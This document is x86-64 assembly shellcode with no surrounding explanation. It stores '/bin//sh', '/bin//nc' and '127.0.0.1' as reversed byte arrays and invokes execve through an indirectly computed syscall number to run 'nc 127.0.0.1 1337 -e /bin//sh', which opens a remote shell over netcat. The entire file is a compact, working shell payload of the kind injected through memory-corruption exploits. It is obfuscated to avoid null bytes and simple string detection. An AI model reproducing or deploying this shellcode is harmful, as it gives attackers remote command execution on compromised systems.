global _start 

section .text

_start:
	jmp next
sh:
	db 0x68,0x73,0x2f,0x2f,0x6e,0x69,0x62,0x2f
nc:
	db 0x63,0x6e,0x2f,0x2f,0x6e,0x69,0x62,0x2f
ip:
	db 0x2e,0x30,0x2e,0x30,0x2e,0x37,0x32,0x31
handle:
	pop rcx
	lodsq
	bswap rax
	push rax
	push rsp
	push rcx
	ret
next:
	xor edx,edx
	lea rsi,[rel sh]
	push rdx
	call handle
	pop rbx

	push rdx
	call handle
	pop rdi

	push '1'
	call handle
	pop r12

	push '1337'
	push rsp
	pop rcx

	push rdx
	push word '-e'
	push rsp
	pop rax
	
	push rdx ; push null
	push rbx ; '/bin//sh'
	push rax ; '-e'
	push rcx ; '1337' 
	push r12 ; '127.0.0.1'
	push rdi ; '/bin//nc'
	push rsp
	pop rsi  ; address of array of pointers to strings
	
	; some magic to put 3b (59) into RAX	 
	; note that this depends on the push "-e" 
	; and it's position on the stack
	mov rax,[rsp + 48]
	shr rax,8
	sub rax,0x2a
	syscall